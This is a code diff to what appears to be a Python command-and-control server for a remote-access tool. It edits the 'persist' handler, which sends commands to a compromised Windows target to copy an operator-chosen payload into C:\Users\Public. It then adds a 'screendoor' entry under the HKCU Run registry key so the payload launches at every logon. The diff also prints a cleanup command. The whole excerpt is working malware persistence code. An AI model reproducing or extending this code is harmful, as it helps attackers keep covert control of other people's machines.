@@ -56,8 +56,9 @@ def target_comm(targ_id, targets, num):
         if message == 'persist':
             payload_name = input('Enter the name of the payload to add to autorun: ')
             if targets[num][6] == 1:
-                persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\Public'
+                persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                 targ_id.send(persist_command_1.encode())
+                time.sleep(5)
                 persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                 targ_id.send(persist_command_2.encode())
                 print('[!] Run this command to clean up the registry: \n reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
